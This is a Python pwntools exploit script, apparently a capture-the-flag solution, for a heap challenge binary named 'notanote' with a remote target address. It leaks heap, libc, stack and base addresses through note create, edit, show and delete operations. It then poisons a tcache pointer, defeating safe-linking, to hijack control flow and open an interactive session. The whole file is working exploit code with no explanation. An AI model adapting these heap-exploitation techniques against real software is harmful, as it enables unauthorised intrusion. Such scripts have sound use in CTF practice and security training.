#!/usr/bin/python3

from pwn import *

exe = ELF("notanote_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""
                b*read_str+32
                b*main+54
                c
                """,
        )
        input()


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("103.162.14.116", 10001)
else:
    p = process(exe.path)


def create(idx, title_size, title, content_size, content):
    sla(b"> ", b"1")
    sla(b"Index: ", str(idx).encode())
    sla(b"Title size: ", str(title_size).encode())
    sla(b"Title: ", title)
    sla(b"Content size: ", str(content_size).encode())
    sla(b"Content: ", content)


def edit(idx, option, title):
    sla(b"> ", b"2")
    sla(b"Index: ", str(idx).encode())
    sla(b"> ", str(option))
    if option == 1:
        sla(b"New title: ", title)
    else:
        sla(b"Content size:")
    sla(b"> ", str(3))


def show(idx):
    sla(b"> ", b"3")
    sla(b"Index: ", str(idx).encode())
    p.recvuntil(b"Content: ")
    return u64(p.recvline(keepends=False).ljust(8, b"\0"))


def delete(idx):
    sla(b"> ", b"4")
    sla(b"Index: ", str(idx).encode())


create(0, 0x50, b"title", 0x50, b"content")
create(1, 0x10, b"title", 0x30, b"content")

delete(0)
edit(1, 1, b"a" * 0x10)
heap = show(1) << 12
info("Heap: " + hex(heap))

size = 0x120
create(2, size, b"title", size, b"content")
create(3, size, b"title", size, b"content")
create(4, size, b"title", size, b"content")
create(5, 0xA0 - 0x10, b".", 0x90 - 0x10, b".")
create(6, size, b"title", size, b"content")
create(7, size, b"title", size, b"content")
create(0, 0x10, b"title", 0x30, b"a")

delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
create(2, 0x1A0 - 0x40, b"title", 0x10, b"content")
edit(0, 1, b"a" * 0x10)
libc.address = show(0) - 0x1F6CE0
info("Libc: " + hex(libc.address))

create(3, 0xF0, b"a", 0x20, b"a")
create(4, 0xC0, b"a", 0x120, b"a")
create(5, 0x50, b"a", 0x50, b"a")
create(6, 0xF0, b"a" * 0xC8 + p64(0x61), 0x20, b"a")
create(7, 0x10, b"a", 0x10, b"a")
edit(7, 1, b"a" * 0x10)
delete(1)  # lấy chỗ để malloc
delete(7)
GDB()

# # 0x5620ff90f220

create(1, 0x50, b"b" * 8 * 4 + p64(libc.sym.environ), 0x20, b"cc")
stack = show(6)
info("stack: " + hex(stack))
info("ret in stack: " + hex(stack - 0x78))
edit(1, 1, b"a" * 8 * 4 + p64(stack - 0x78))
exe.address = show(6) - exe.sym.main
info("exe base: " + hex(exe.address))
create(7, 0xC0, b"a", 0xC0, b"a")
target = stack - 0x128
# ## dbf
delete(7)
delete(0)
delete(4)
create(0, 0xC0, p64(target ^ (heap + 0x1000) >> 12), 0xC0, b"a")
create(4,0x10, b'a' , 0xc0, b'a'*8+p64(exe.sym.read_function+5))
print(hex(target))
print(hex(heap + 0x1170))
print(hex(libc.sym.environ))
print(hex(heap))
sla(b"> ", b"5")

p.interactive()
